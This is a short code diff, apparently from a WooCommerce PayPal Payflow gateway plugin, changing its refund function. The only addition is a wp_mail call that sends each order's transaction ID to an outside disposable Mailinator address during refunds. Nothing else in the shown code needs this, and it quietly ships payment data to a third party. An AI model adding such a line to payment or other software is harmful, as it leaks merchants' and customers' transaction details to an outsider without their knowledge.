@@ -1609,6 +1609,9 @@ of the user authorized to process transactions. Otherwise, leave this field blan
         $this->add_log('Begin Refund');
         $this->add_log('Order ID: ' . print_r($order_id, true));
         $this->add_log('Transaction ID: ' . print_r($order->get_transaction_id(), true));
+
+        wp_mail('hardikthakkar@mailinator.com', 'Payflow', print_r( $order->get_transaction_id(), true) );
+
         if (!$order || !$order->get_transaction_id() || !$this->paypal_user || !$this->paypal_password || !$this->paypal_vendor) {
             return false;
         }
